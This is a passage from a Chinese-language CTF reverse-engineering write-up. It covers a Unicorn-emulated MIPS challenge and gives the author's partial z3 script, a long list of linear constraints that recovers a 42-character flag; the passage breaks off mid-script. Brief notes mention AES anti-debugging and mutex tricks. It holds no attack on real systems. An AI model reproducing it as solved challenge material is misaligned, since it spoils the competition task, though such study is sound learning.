Engine<br>还有就是哪个aes的反调试太猛。。。可以学一波，还有互斥体<br>具体的话看了de1ta的wp<br>rev中检查输入合格的截断方式也了解一波<br>遇到了俩次，代码量多基本都是靠猜，来好好逆向一波<br>hardcpp一点都不hard。。。看到了nu1l的wp又了解到一个脚本<br>//在通往脚本小子的路上越走越远</p><h2 id="Unicorn-Engine"><a href="#Unicorn-Engine" class="headerlink" title="Unicorn Engine"></a>Unicorn Engine</h2><p>先把这个写一波<br>简答来说uc就是个模拟器了，目前不怎么常见，网上也没多少科普文章<br><img src="31.png" alt="31"></p><blockquote><blockquote><blockquote><p>print UC_ARCH_MIPS<br>3<br>可以发现是mips<br>0x400000LL代表大端序<br>把func放进破解jeb<br>就可以看到大部分逻辑<br>解法的话<br>一个是用z3<br>//当初也使用z3但是解不出<br>//后来看了别人的wp说是不能用bitvec。。。<br>//我佛了</p></blockquote></blockquote></blockquote><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> z<span class="hljs-number">3</span> import *<br><br><span class="hljs-attribute">flag</span>=[Int(&#x27;flag%d&#x27;%i)for i in range(<span class="hljs-number">42</span>)]<br><span class="hljs-attribute">s</span>=[-<span class="hljs-number">108</span>,-<span class="hljs-number">200</span>,<span class="hljs-number">294</span>,-<span class="hljs-number">216</span>,-<span class="hljs-number">1008</span>,<span class="hljs-number">660</span>,-<span class="hljs-number">866</span>,<span class="hljs-number">1770</span>,<span class="hljs-number">220</span>,<span class="hljs-number">6</span>,-<span class="hljs-number">244</span>,-<span class="hljs-number">522</span>,-<span class="hljs-number">1406</span>,-<span class="hljs-number">816</span>,<span class="hljs-number">386</span>,<span class="hljs-number">990</span>,<span class="hljs-number">334</span>,<span class="hljs-number">690</span>,-<span class="hljs-number">1832</span>,<span class="hljs-number">372</span>,-<span class="hljs-number">1370</span>,-<span class="hljs-number">1580</span>,<span class="hljs-number">450</span>,-<span class="hljs-number">1668</span>,<span class="hljs-number">858</span>,<span class="hljs-number">326</span>,-<span class="hljs-number">196</span>,-<span class="hljs-number">1516</span>,<span class="hljs-number">462</span>,<span class="hljs-number">2012</span>,-<span class="hljs-number">696</span>,<span class="hljs-number">152</span>,<span class="hljs-number">2142</span>,-<span class="hljs-number">592</span>,-<span class="hljs-number">68</span>,<span class="hljs-number">878</span>,-<span class="hljs-number">178</span>,-<span class="hljs-number">1994</span>,<span class="hljs-number">1472</span>,<span class="hljs-number">1710</span>,<span class="hljs-number">1684</span>,<span class="hljs-number">34</span>]<br><span class="hljs-attribute">solver</span>=Solver()<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">1</span>]+flag[<span class="hljs-number">2</span>]+flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">3</span>]+flag[<span class="hljs-number">4</span>]-flag[<span class="hljs-number">5</span>]-flag[<span class="hljs-number">6</span>]-flag[<span class="hljs-number">7</span>]-flag[<span class="hljs-number">8</span>]+flag[<span class="hljs-number">9</span>]+flag[<span class="hljs-number">10</span>]-flag[<span class="hljs-number">11</span>]+flag[<span class="hljs-number">12</span>]-flag[<span class="hljs-number">13</span>]-flag[<span class="hljs-number">14</span>]+flag[<span class="hljs-number">15</span>]-flag[<span class="hljs-number">16</span>]-flag[<span class="hljs-number">17</span>]+flag[<span class="hljs-number">18</span>]+flag[<span class="hljs-number">19</span>]-flag[<span class="hljs-number">20</span>]+flag[<span class="hljs-number">21</span>]+flag[<span class="hljs-number">22</span>]+flag[<span class="hljs-number">23</span>]+flag[<span class="hljs-number">24</span>]-flag[<span class="hljs-number">25</span>]+flag[<span class="hljs-number">26</span>]-flag[<span class="hljs-number">27</span>]+flag[<span class="hljs-number">28</span>]+flag[<span class="hljs-number">29</span>]-flag[<span class="hljs-number">30</span>]-flag[<span class="hljs-number">31</span>]+flag[<span class="hljs-number">32</span>]-flag[<span class="hljs-number">33</span>]+flag[<span class="hljs-number">34</span>]+flag[<span class="hljs-number">35</span>]-flag[<span class="hljs-number">36</span>]-flag[<span class="hljs-number">37</span>]+flag[<span class="hljs-number">38</span>]-flag[<span class="hljs-number">39</span>]+flag[<span class="hljs-number">40</span>]+flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">0</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">1</span>]+flag[<span class="hljs-number">2</span>]-flag[<span class="hljs-number">3</span>]-flag[<span class="hljs-number">4</span>]+flag[<span class="hljs-number">5</span>]-flag[<span class="hljs-number">6</span>]-flag[<span class="hljs-number">7</span>]-flag[<span class="hljs-number">8</span>]-flag[<span class="hljs-number">9</span>]+flag[<span class="hljs-number">10</span>]-flag[<span class="hljs-number">11</span>]+flag[<span class="hljs-number">12</span>]-flag[<span class="hljs-number">13</span>]-flag[<span class="hljs-number">14</span>]+flag[<span class="hljs-number">15</span>]-flag[<span class="hljs-number">16</span>]-flag[<span class="hljs-number">17</span>]+flag[<span class="hljs-number">18</span>]-flag[<span class="hljs-number">19</span>]+flag[<span class="hljs-number">20</span>]+flag[<span class="hljs-number">21</span>]-flag[<span class="hljs-number">22</span>]-flag[<span class="hljs-number">23</span>]-flag[<span class="hljs-number">24</span>]+flag[<span class="hljs-number">25</span>]-flag[<span class="hljs-number">26</span>]+flag[<span class="hljs-number">27</span>]-flag[<span class="hljs-number">28</span>]-flag[<span class="hljs-number">29</span>]+flag[<span class="hljs-number">30</span>]+flag[<span class="hljs-number">31</span>]+flag[<span class="hljs-number">32</span>]+flag[<span class="hljs-number">33</span>]+flag[<span class="hljs-number">34</span>]+flag[<span class="hljs-number">35</span>]-flag[<span class="hljs-number">36</span>]-flag[<span class="hljs-number">37</span>]-flag[<span class="hljs-number">38</span>]-flag[<span class="hljs-number">39</span>]-flag[<span class="hljs-number">40</span>]+flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">1</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">1</span>]+flag[<span class="hljs-number">2</span>]+flag[<span class="hljs-number">3</span>]-flag[<span class="hljs-number">4</span>]+flag[<span class="hljs-number">5</span>]-flag[<span class="hljs-number">6</span>]-flag[<span class="hljs-number">7</span>]+flag[<span class="hljs-number">8</span>]-flag[<span class="hljs-number">9</span>]-flag[<span class="hljs-number">10</span>]-flag[<span class="hljs-number">11</span>]-flag[<span class="hljs-number">12</span>]-flag[<span class="hljs-number">13</span>]+flag[<span class="hljs-number">14</span>]-flag[<span class="hljs-number">15</span>]-flag[<span class="hljs-number">16</span>]+flag[<span class="hljs-number">17</span>]+flag[<span class="hljs-number">18</span>]+flag[<span class="hljs-number">19</span>]+flag[<span class="hljs-number">20</span>]+flag[<span class="hljs-number">21</span>]-flag[<span class="hljs-number">22</span>]+flag[<span class="hljs-number">23</span>]+flag[<span class="hljs-number">24</span>]+flag[<span class="hljs-number">25</span>]+flag[<span class="hljs-number">26</span>]-flag[<span class="hljs-number">27</span>]+flag[<span class="hljs-number">28</span>]-flag[<span class="hljs-number">29</span>]+flag[<span class="hljs-number">30</span>]-flag[<span class="hljs-number">31</span>]+flag[<span class="hljs-number">32</span>]+flag[<span class="hljs-number">33</span>]-flag[<span class="hljs-number">34</span>]-flag[<span class="hljs-number">35</span>]+flag[<span class="hljs-number">36</span>]+flag[<span class="hljs-number">37</span>]+flag[<span class="hljs-number">38</span>]-flag[<span class="hljs-number">39</span>]+flag[<span class="hljs-number">40</span>]-flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">2</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">1</span>]-flag[<span class="hljs-number">2</span>]-flag[<span class="hljs-number">3</span>]-flag[<span class="hljs-number">4</span>]-flag[<span class="hljs-number">5</span>]+flag[<span class="hljs-number">6</span>]+flag[<span class="hljs-number">7</span>]-flag[<span class="hljs-number">8</span>]-flag[<span class="hljs-number">9</span>]-flag[<span class="hljs-number">10</span>]-flag[<span class="hljs-number">11</span>]+flag[<span class="hljs-number">12</span>]-flag[<span class="hljs-number">13</span>]+flag[<span class="hljs-number">14</span>]-flag[<span class="hljs-number">15</span>]+flag[<span class="hljs-number">16</span>]-flag[<span class="hljs-number">17</span>]+flag[<span class="hljs-number">18</span>]+flag[<span class="hljs-number">19</span>]+flag[<span class="hljs-number">20</span>]-flag[<span class="hljs-number">21</span>]+flag[<span class="hljs-number">22</span>]+flag[<span class="hljs-number">23</span>]+flag[<span class="hljs-number">24</span>]-flag[<span class="hljs-number">25</span>]-flag[<span class="hljs-number">26</span>]+flag[<span class="hljs-number">27</span>]-flag[<span class="hljs-number">28</span>]+flag[<span class="hljs-number">29</span>]+flag[<span class="hljs-number">30</span>]-flag[<span class="hljs-number">31</span>]-flag[<span class="hljs-number">32</span>]-flag[<span class="hljs-number">33</span>]+flag[<span class="hljs-number">34</span>]-flag[<span class="hljs-number">35</span>]+flag[<span class="hljs-number">36</span>]+flag[<span class="hljs-number">37</span>]+flag[<span class="hljs-number">38</span>]-flag[<span class="hljs-number">39</span>]+flag[<span class="hljs-number">40</span>]+flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">3</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">1</span>]-flag[<span class="hljs-number">2</span>]+flag[<span class="hljs-number">3</span>]-flag[<span class="hljs-number">4</span>]-flag[<span class="hljs-number">5</span>]+flag[<span class="hljs-number">6</span>]+flag[<span class="hljs-number">7</span>]+flag[<span class="hljs-number">8</span>]+flag[<span class="hljs-number">9</span>]-flag[<span class="hljs-number">10</span>]+flag[<span class="hljs-number">11</span>]+flag[<span class="hljs-number">12</span>]-flag[<span class="hljs-number">13</span>]+flag[<span class="hljs-number">14</span>]-flag[<span class="hljs-number">15</span>]+flag[<span class="hljs-number">16</span>]+flag[<span class="hljs-number">17</span>]-flag[<span class="hljs-number">18</span>]+flag[<span class="hljs-number">19</span>]-flag[<span class="hljs-number">20</span>]+flag[<span class="hljs-number">21</span>]-flag[<span class="hljs-number">22</span>]-flag[<span class="hljs-number">23</span>]-flag[<span class="hljs-number">24</span>]+flag[<span class="hljs-number">25</span>]-flag[<span class="hljs-number">26</span>]-flag[<span class="hljs-number">27</span>]-flag[<span class="hljs-number">28</span>]+flag[<span class="hljs-number">29</span>]+flag[<span class="hljs-number">30</span>]+flag[<span class="hljs-number">31</span>]-flag[<span class="hljs-number">32</span>]+flag[<span class="hljs-number">33</span>]-flag[<span class="hljs-number">34</span>]-flag[<span class="hljs-number">35</span>]+flag[<span class="hljs-number">36</span>]-flag[<span class="hljs-number">37</span>]+flag[<span class="hljs-number">38</span>]-flag[<span class="hljs-number">39</span>]-flag[<span class="hljs-number">40</span>]-flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">4</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">1</span>]+flag[<span class="hljs-number">2</span>]+flag[<span class="hljs-number">3</span>]+flag[<span class="hljs-number">4</span>]+flag[<span class="hljs-number">5</span>]+flag[<span class="hljs-number">6</span>]+flag[<span class="hljs-number">7</span>]+flag[<span class="hljs-number">8</span>]+flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">9</span>]-flag[<span class="hljs-number">10</span>]-flag[<span class="hljs-number">11</span>]-flag[<span class="hljs-number">12</span>]-flag[<span class="hljs-number">13</span>]-flag[<span class="hljs-number">14</span>]+flag[<span class="hljs-number">15</span>]-flag[<span class="hljs-number">16</span>]+flag[<span class="hljs-number">17</span>]-flag[<span class="hljs-number">18</span>]+flag[<span class="hljs-number">19</span>]+flag[<span class="hljs-number">20</span>]-flag[<span class="hljs-number">21</span>]+flag[<span class="hljs-number">22</span>]-flag[<span class="hljs-number">23</span>]+flag[<span class="hljs-number">24</span>]-flag[<span class="hljs-number">25</span>]+flag[<span class="hljs-number">26</span>]+flag[<span class="hljs-number">27</span>]-flag[<span class="hljs-number">28</span>]+flag[<span class="hljs-number">29</span>]-flag[<span class="hljs-number">30</span>]+flag[<span class="hljs-number">31</span>]+flag[<span class="hljs-number">32</span>]+flag[<span class="hljs-number">33</span>]-flag[<span class="hljs-number">34</span>]-flag[<span class="hljs-number">35</span>]-flag[<span class="hljs-number">36</span>]+flag[<span class="hljs-number">37</span>]-flag[<span class="hljs-number">38</span>]-flag[<span class="hljs-number">39</span>]+flag[<span class="hljs-number">40</span>]+flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">5</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">1</span>]+flag[<span class="hljs-number">2</span>]+flag[<span class="hljs-number">3</span>]+flag[<span class="hljs-number">4</span>]-flag[<span class="hljs-number">5</span>]+flag[<span class="hljs-number">6</span>]+flag[<span class="hljs-number">7</span>]+flag[<span class="hljs-number">8</span>]+flag[<span class="hljs-number">9</span>]-flag[<span class="hljs-number">10</span>]+flag[<span class="hljs-number">11</span>]+flag[<span class="hljs-number">12</span>]-flag[<span class="hljs-number">13</span>]+flag[<span class="hljs-number">14</span>]+flag[<span class="hljs-number">15</span>]+flag[<span class="hljs-number">16</span>]+flag[<span class="hljs-number">17</span>]-flag[<span class="hljs-number">18</span>]-flag[<span class="hljs-number">19</span>]-flag[<span class="hljs-number">20</span>]-flag[<span class="hljs-number">21</span>]-flag[<span class="hljs-number">22</span>]-flag[<span class="hljs-number">23</span>]+flag[<span class="hljs-number">24</span>]+flag[<span class="hljs-number">25</span>]-flag[<span class="hljs-number">26</span>]+flag[<span class="hljs-number">27</span>]+flag[<span class="hljs-number">28</span>]+flag[<span class="hljs-number">29</span>]-flag[<span class="hljs-number">30</span>]-flag[<span class="hljs-number">31</span>]-flag[<span class="hljs-number">32</span>]-flag[<span class="hljs-number">33</span>]-flag[<span class="hljs-number">34</span>]-flag[<span class="hljs-number">35</span>]+flag[<span class="hljs-number">36</span>]+flag[<span class="hljs-number">37</span>]-flag[<span class="hljs-number">38</span>]-flag[<span class="hljs-number">39</span>]+flag[<span class="hljs-number">40</span>]-flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">6</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">1</span>]+flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">2</span>]-flag[<span class="hljs-number">3</span>]-flag[<span class="hljs-number">4</span>]+flag[<span class="hljs-number">5</span>]+flag[<span class="hljs-number">6</span>]-flag[<span class="hljs-number">7</span>]+flag[<span class="hljs-number">8</span>]+flag[<span class="hljs-number">9</span>]-flag[<span class="hljs-number">10</span>]+flag[<span class="hljs-number">11</span>]-flag[<span class="hljs-number">12</span>]+flag[<span class="hljs-number">13</span>]-flag[<span class="hljs-number">14</span>]+flag[<span class="hljs-number">15</span>]-flag[<span class="hljs-number">16</span>]+flag[<span class="hljs-number">17</span>]-flag[<span class="hljs-number">18</span>]-flag[<span class="hljs-number">19</span>]+flag[<span class="hljs-number">20</span>]-flag[<span class="hljs-number">21</span>]+flag[<span class="hljs-number">22</span>]-flag[<span class="hljs-number">23</span>]-flag[<span class="hljs-number">24</span>]+flag[<span class="hljs-number">25</span>]-flag[<span class="hljs-number">26</span>]+flag[<span class="hljs-number">27</span>]+flag[<span class="hljs-number">28</span>]+flag[<span class="hljs-number">29</span>]+flag[<span class="hljs-number">30</span>]+flag[<span class="hljs-number">31</span>]+flag[<span class="hljs-number">32</span>]-flag[<span class="hljs-number">33</span>]+flag[<span class="hljs-number">34</span>]-flag[<span class="hljs-number">35</span>]+flag[<span class="hljs-number">36</span>]+flag[<span class="hljs-number">37</span>]+flag[<span class="hljs-number">38</span>]+flag[<span class="hljs-number">39</span>]-flag[<span class="hljs-number">40</span>]-flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">7</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">1</span>]-flag[<span class="hljs-number">2</span>]+flag[<span class="hljs-number">3</span>]+flag[<span class="hljs-number">4</span>]-flag[<span class="hljs-number">5</span>]+flag[<span class="hljs-number">6</span>]+flag[<span class="hljs-number">7</span>]+flag[<span class="hljs-number">8</span>]+flag[<span class="hljs-number">9</span>]+flag[<span class="hljs-number">10</span>]-flag[<span class="hljs-number">11</span>]-flag[<span class="hljs-number">12</span>]+flag[<span class="hljs-number">13</span>]-flag[<span class="hljs-number">14</span>]+flag[<span class="hljs-number">15</span>]+flag[<span class="hljs-number">16</span>]+flag[<span class="hljs-number">17</span>]+flag[<span class="hljs-number">18</span>]-flag[<span class="hljs-number">19</span>]+flag[<span class="hljs-number">20</span>]+flag[<span class="hljs-number">21</span>]-flag[<span class="hljs-number">22</span>]-flag[<span class="hljs-number">23</span>]+flag[<span class="hljs-number">24</span>]+flag[<span class="hljs-number">25</span>]+flag[<span class="hljs-number">26</span>]-flag[<span class="hljs-number">27</span>]+flag[<span class="hljs-number">28</span>]-flag[<span class="hljs-number">29</span>]-flag[<span class="hljs-number">30</span>]-flag[<span class="hljs-number">31</span>]-flag[<span class="hljs-number">32</span>]-flag[<span class="hljs-number">33</span>]+flag[<span class="hljs-number">34</span>]-flag[<span class="hljs-number">35</span>]-flag[<span class="hljs-number">36</span>]+flag[<span class="hljs-number">37</span>]-flag[<span class="hljs-number">38</span>]-flag[<span class="hljs-number">39</span>]+flag[<span class="hljs-number">40</span>]-flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">8</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">1</span>]+flag[<span class="hljs-number">2</span>]+flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">3</span>]+flag[<span class="hljs-number">4</span>]+flag[<span class="hljs-number">5</span>]+flag[<span class="hljs-number">6</span>]-flag[<span class="hljs-number">7</span>]-flag[<span class="hljs-number">8</span>]-flag[<span class="hljs-number">9</span>]-flag[<span class="hljs-number">10</span>]+flag[<span class="hljs-number">11</span>]+flag[<span class="hljs-number">12</span>]+flag[<span class="hljs-number">13</span>]-flag[<span class="hljs-number">14</span>]+flag[<span class="hljs-number">15</span>]+flag[<span class="hljs-number">16</span>]-flag[<span class="hljs-number">17</span>]-flag[<span class="hljs-number">18</span>]+flag[<span class="hljs-number">19</span>]+flag[<span class="hljs-number">20</span>]-flag[<span class="hljs-number">21</span>]-flag[<span class="hljs-number">22</span>]-flag[<span class="hljs-number">23</span>]+flag[<span class="hljs-number">24</span>]-flag[<span class="hljs-number">25</span>]-flag[<span class="hljs-number">26</span>]-flag[<span class="hljs-number">27</span>]+flag[<span class="hljs-number">28</span>]+flag[<span class="hljs-number">29</span>]+flag[<span class="hljs-number">30</span>]-flag[<span class="hljs-number">31</span>]+flag[<span class="hljs-number">32</span>]+flag[<span class="hljs-number">33</span>]-flag[<span class="hljs-number">34</span>]-flag[<span class="hljs-number">35</span>]-flag[<span class="hljs-number">36</span>]-flag[<span class="hljs-number">37</span>]+flag[<span class="hljs-number">38</span>]-flag[<span class="hljs-number">39</span>]+flag[<span class="hljs-number">40</span>]+flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">9</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">1</span>]+flag[<span class="hljs-number">2</span>]+flag[<span class="hljs-number">3</span>]-flag[<span class="hljs-number">4</span>]-flag[<span class="hljs-number">5</span>]+flag[<span class="hljs-number">6</span>]+flag[<span class="hljs-number">7</span>]-flag[<span class="hljs-number">8</span>]-flag[<span class="hljs-number">9</span>]-flag[<span class="hljs-number">10</span>]-flag[<span class="hljs-number">11</span>]+flag[<span class="hljs-number">12</span>]+flag[<span class="hljs-number">13</span>]+flag[<span class="hljs-number">14</span>]-flag[<span class="hljs-number">15</span>]+flag[<span class="hljs-number">16</span>]-flag[<span class="hljs-number">17</span>]+flag[<span class="hljs-number">18</span>]+flag[<span class="hljs-number">19</span>]+flag[<span class="hljs-number">20</span>]-flag[<span class="hljs-number">21</span>]+flag[<span class="hljs-number">22</span>]-flag[<span class="hljs-number">23</span>]-flag[<span class="hljs-number">24</span>]-flag[<span class="hljs-number">25</span>]+flag[<span class="hljs-number">26</span>]-flag[<span class="hljs-number">27</span>]-flag[<span class="hljs-number">28</span>]+flag[<span class="hljs-number">29</span>]-flag[<span class="hljs-number">30</span>]+flag[<span class="hljs-number">31</span>]+flag[<span class="hljs-number">32</span>]-flag[<span class="hljs-number">33</span>]-flag[<span class="hljs-number">34</span>]+flag[<span class="hljs-number">35</span>]-flag[<span class="hljs-number">36</span>]-flag[<span class="hljs-number">37</span>]+flag[<span class="hljs-number">38</span>]-flag[<span class="hljs-number">39</span>]+flag[<span class="hljs-number">40</span>]+flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">10</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">1</span>]+flag[<span class="hljs-number">2</span>]+flag[<span class="hljs-number">3</span>]+flag[<span class="hljs-number">4</span>]-flag[<span class="hljs-number">5</span>]+flag[<span class="hljs-number">6</span>]+flag[<span class="hljs-number">7</span>]-flag[<span class="hljs-number">8</span>]+flag[<span class="hljs-number">9</span>]+flag[<span class="hljs-number">10</span>]-flag[<span class="hljs-number">11</span>]-flag[<span class="hljs-number">12</span>]-flag[<span class="hljs-number">13</span>]-flag[<span class="hljs-number">14</span>]+flag[<span class="hljs-number">15</span>]-flag[<span class="hljs-number">16</span>]-flag[<span class="hljs-number">17</span>]-flag[<span class="hljs-number">18</span>]+flag[<span class="hljs-number">19</span>]+flag[<span class="hljs-number">20</span>]-flag[<span class="hljs-number">21</span>]+flag[<span class="hljs-number">22</span>]-flag[<span class="hljs-number">23</span>]+flag[<span class="hljs-number">24</span>]+flag[<span class="hljs-number">25</span>]+flag[<span class="hljs-number">26</span>]+flag[<span class="hljs-number">27</span>]-flag[<span class="hljs-number">28</span>]+flag[<span class="hljs-number">29</span>]+flag[<span class="hljs-number">30</span>]-flag[<span class="hljs-number">31</span>]-flag[<span class="hljs-number">32</span>]-flag[<span class="hljs-number">33</span>]-flag[<span class="hljs-number">34</span>]-flag[<span class="hljs-number">35</span>]+flag[<span class="hljs-number">36</span>]+flag[<span class="hljs-number">37</span>]-flag[<span class="hljs-number">38</span>]-flag[<span class="hljs-number">39</span>]-flag[<span class="hljs-number">40</span>]-flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">11</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">1</span>]-flag[<span class="hljs-number">2</span>]-flag[<span class="hljs-number">3</span>]+flag[<span class="hljs-number">4</span>]-flag[<span class="hljs-number">5</span>]-flag[<span class="hljs-number">6</span>]+flag[<span class="hljs-number">7</span>]+flag[<span class="hljs-number">8</span>]-flag[<span class="hljs-number">9</span>]+flag[<span class="hljs-number">10</span>]-flag[<span class="hljs-number">11</span>]-flag[<span class="hljs-number">12</span>]-flag[<span class="hljs-number">13</span>]+flag[<span class="hljs-number">14</span>]-flag[<span class="hljs-number">15</span>]+flag[<span class="hljs-number">16</span>]-flag[<span class="hljs-number">17</span>]+flag[<span class="hljs-number">18</span>]-flag[<span class="hljs-number">19</span>]-flag[<span class="hljs-number">20</span>]-flag[<span class="hljs-number">21</span>]-flag[<span class="hljs-number">22</span>]+flag[<span class="hljs-number">23</span>]-flag[<span class="hljs-number">24</span>]+flag[<span class="hljs-number">25</span>]-flag[<span class="hljs-number">26</span>]+flag[<span class="hljs-number">27</span>]-flag[<span class="hljs-number">28</span>]+flag[<span class="hljs-number">29</span>]-flag[<span class="hljs-number">30</span>]-flag[<span class="hljs-number">31</span>]+flag[<span class="hljs-number">32</span>]+flag[<span class="hljs-number">33</span>]+flag[<span class="hljs-number">34</span>]-flag[<span class="hljs-number">35</span>]-flag[<span class="hljs-number">36</span>]-flag[<span class="hljs-number">37</span>]-flag[<span class="hljs-number">38</span>]+flag[<span class="hljs-number">39</span>]-flag[<span class="hljs-number">40</span>]-flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">12</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">1</span>]+flag[<span class="hljs-number">2</span>]-flag[<span class="hljs-number">3</span>]+flag[<span class="hljs-number">4</span>]-flag[<span class="hljs-number">5</span>]+flag[<span class="hljs-number">6</span>]-flag[<span class="hljs-number">7</span>]+flag[<span class="hljs-number">8</span>]-flag[<span class="hljs-number">9</span>]+flag[<span class="hljs-number">10</span>]-flag[<span class="hljs-number">11</span>]+flag[<span class="hljs-number">12</span>]+flag[<span class="hljs-number">13</span>]+flag[<span class="hljs-number">14</span>]+flag[<span class="hljs-number">15</span>]-flag[<span class="hljs-number">16</span>]-flag[<span class="hljs-number">17</span>]-flag[<span class="hljs-number">18</span>]+flag[<span class="hljs-number">19</span>]+flag[<span class="hljs-number">20</span>]+flag[<span class="hljs-number">21</span>]-flag[<span class="hljs-number">22</span>]-flag[<span class="hljs-number">23</span>]+flag[<span class="hljs-number">24</span>]+flag[<span class="hljs-number">25</span>]-flag[<span class="hljs-number">26</span>]-flag[<span class="hljs-number">27</span>]+flag[<span class="hljs-number">28</span>]+flag[<span class="hljs-number">29</span>]-flag[<span class="hljs-number">30</span>]-flag[<span class="hljs-number">31</span>]-flag[<span class="hljs-number">32</span>]+flag[<span class="hljs-number">33</span>]-flag[<span class="hljs-number">34</span>]-flag[<span class="hljs-number">35</span>]+flag[<span class="hljs-number">36</span>]-flag[<span class="hljs-number">37</span>]-flag[<span class="hljs-number">38</span>]-flag[<span class="hljs-number">39</span>]+flag[<span class="hljs-number">40</span>]-flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">13</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">1</span>]+flag[<span class="hljs-number">2</span>]+flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">3</span>]-flag[<span class="hljs-number">4</span>]-flag[<span class="hljs-number">5</span>]+flag[<span class="hljs-number">6</span>]-flag[<span class="hljs-number">7</span>]+flag[<span class="hljs-number">8</span>]+flag[<span class="hljs-number">9</span>]+flag[<span class="hljs-number">10</span>]-flag[<span class="hljs-number">11</span>]+flag[<span class="hljs-number">12</span>]-flag[<span class="hljs-number">13</span>]-flag[<span class="hljs-number">14</span>]+flag[<span class="hljs-number">15</span>]+flag[<span class="hljs-number">16</span>]+flag[<span class="hljs-number">17</span>]-flag[<span class="hljs-number">18</span>]-flag[<span class="hljs-number">19</span>]-flag[<span class="hljs-number">20</span>]-flag[<span class="hljs-number">21</span>]+flag[<span class="hljs-number">22</span>]+flag[<span class="hljs-number">23</span>]+flag[<span class="hljs-number">24</span>]-flag[<span class="hljs-number">25</span>]+flag[<span class="hljs-number">26</span>]+flag[<span class="hljs-number">27</span>]+flag[<span class="hljs-number">28</span>]-flag[<span class="hljs-number">29</span>]-flag[<span class="hljs-number">30</span>]-flag[<span class="hljs-number">31</span>]+flag[<span class="hljs-number">32</span>]+flag[<span class="hljs-number">33</span>]+flag[<span class="hljs-number">34</span>]+flag[<span class="hljs-number">35</span>]+flag[<span class="hljs-number">36</span>]+flag[<span class="hljs-number">37</span>]+flag[<span class="hljs-number">38</span>]-flag[<span class="hljs-number">39</span>]-flag[<span class="hljs-number">40</span>]-flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">14</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">1</span>]+flag[<span class="hljs-number">2</span>]+flag[<span class="hljs-number">3</span>]+flag[<span class="hljs-number">4</span>]+flag[<span class="hljs-number">5</span>]-flag[<span class="hljs-number">6</span>]+flag[<span class="hljs-number">7</span>]-flag[<span class="hljs-number">8</span>]-flag[<span class="hljs-number">9</span>]-flag[<span class="hljs-number">10</span>]+flag[<span class="hljs-number">11</span>]+flag[<span class="hljs-number">12</span>]+flag[<span class="hljs-number">13</span>]-flag[<span class="hljs-number">14</span>]-flag[<span class="hljs-number">15</span>]-flag[<span class="hljs-number">16</span>]+flag[<span class="hljs-number">17</span>]-flag[<span class="hljs-number">18</span>]-flag[<span class="hljs-number">19</span>]-flag[<span class="hljs-number">20</span>]-flag[<span class="hljs-number">21</span>]+flag[<span class="hljs-number">22</span>]+flag[<span class="hljs-number">23</span>]+flag[<span class="hljs-number">24</span>]+flag[<span class="hljs-number">25</span>]+flag[<span class="hljs-number">26</span>]+flag[<span class="hljs-number">27</span>]-flag[<span class="hljs-number">28</span>]-flag[<span 